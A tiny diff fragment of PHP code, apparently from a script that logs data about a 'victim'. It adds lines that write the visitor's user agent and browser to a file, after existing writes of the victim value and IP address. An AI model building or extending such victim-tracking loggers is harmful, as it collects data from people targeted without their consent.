@@ -24,6 +24,9 @@ fwrite($fp, $victim);
 
 fwrite($fp, $ipaddress);
 
+fwrite($fp, $useragent);
+
+fwrite($fp, $browser);
 
 
 
